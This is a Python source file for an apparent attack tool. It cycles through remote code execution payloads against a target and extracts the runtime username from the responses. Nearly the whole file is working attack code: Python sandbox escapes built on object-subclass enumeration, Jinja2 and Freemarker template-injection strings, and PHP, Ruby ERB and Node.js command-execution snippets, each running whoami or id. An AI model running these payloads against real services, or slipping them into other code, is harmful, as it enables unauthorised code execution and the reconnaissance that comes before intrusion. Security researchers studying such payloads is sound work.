# app/tools/runtime_user_fingerprint.py
import re

class RuntimeUserFingerprint:
    def __init__(self):
        self.payloads = self._build_payloads()
        self.username_regex = re.compile(r'([a-zA-Z0-9_-]{1,32})')

    def _build_payloads(self):
        """Payloads to execute whoami/id in various scenarios including Python sandbox escapes."""
        return [
            # Direct Python exec (no sandbox)
            "import os;print(os.popen('whoami').read())",
            "import os;print(os.popen('id').read())",

            # Builtins-based import (sandboxed, __import__ allowed)
            "print((lambda:0).__globals__['__builtins__']['__import__']('os').popen('whoami').read())",
            "print((lambda:0).__globals__['__builtins__']['__import__']('os').popen('id').read())",

            # Python sandbox escape - object enumeration
            "().__class__.__base__.__subclasses__()[104]('whoami', shell=True, stdout=-1).communicate()[0].decode()",
            "().__class__.__base__.__subclasses__()[59]('whoami', shell=True, stdout=-1).communicate()[0].decode()",
            "[c for c in ().__class__.__base__.__subclasses__() if 'Popen' in c.__name__][0]('whoami', shell=True, stdout=-1).communicate()[0].decode()",
            
            # Indirect command execution primitives
            "().__class__.__base__.__subclasses__()[40].__init__.__globals__['sys'].modules['os'].popen('whoami').read()",
            "''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].popen('whoami').read()",
            
            # Subclasses trick (Python, no import access)
            "for cls in ().__class__.__base__.__subclasses__():\n    if cls.__name__ == 'Popen':\n        print(cls('whoami', shell=True, stdout=-1).communicate()[0].decode())",
            
            # Sandbox bypass - string concatenation
            "print((lambda:0).__globals__['sy'+'s'].modules['o'+'s'].popen('whoami').read())",
            "[c for c in (1).__class__.__base__.__subclasses__() if c.__name__=='Quitter'][0].__init__.__globals__['sy'+'s'].modules['o'+'s'].popen('whoami').read()",
            
            # Advanced sandbox escapes with encoding
            "().__class__.__base__.__subclasses__()[104]('wh'+'oami', shell=True, stdout=-1).communicate()[0].decode()",
            "getattr(().__class__.__base__.__subclasses__()[104], 'Po'+'pen')('whoami', shell=True, stdout=-1).communicate()[0].decode()",
            
            # Config-based Flask/Jinja2 escape
            "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
            "{{ cycler.__init__.__globals__.os.popen('whoami').read() }}",
            
            # PHP execution
            "<?php echo shell_exec('whoami'); ?>",
            "<?php system('whoami'); ?>",
            
            # Freemarker SSTI
            '${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}',
            
            # Ruby ERB
            "#{`whoami`}",
            "<%= `whoami` %>",
            
            # Node.js
            "require('child_process').exec('whoami', (e,stdout) => console.log(stdout))",
        ]

    def run(self, send_code_func):
        """
        Try payloads to determine runtime account.
        
        send_code_func: function that takes a string (payload) and returns the raw HTTP response text.
        """
        for payload in self.payloads:
            try:
                resp = send_code_func(payload)
                user = self._extract_username(resp)
                if user:
                    return user
            except Exception:
                continue
        return None

    def _extract_username(self, text):
        """Extract plausible username from response with enhanced patterns."""
        # Look for common username patterns
        patterns = [
            r'uid=\d+\(([^)]+)\)',  # Linux id output
            r'^([a-zA-Z0-9_-]+)$',  # Simple username
            r'([a-zA-Z0-9_-]+)\\',  # Windows domain\user
            r'b\'([^\']*)\'\'',  # Python bytes output b'username'
            r'([a-zA-Z0-9_\-\.@]{2,32})',  # General username format
        ]
        
        # Clean the text first
        cleaned_text = text.strip().replace('\\n', '\n').replace('\\r', '')
        
        for pattern in patterns:
            m = re.search(pattern, cleaned_text, re.MULTILINE)
            if m:
                candidate = m.group(1).strip()
                # Avoid false positives
                if (candidate.lower() not in ["error", "none", "null", "false", "true", "test"] and 
                    len(candidate) > 1 and 
                    not candidate.isdigit() and
                    not candidate.startswith('\\')):
                    return candidate
        return None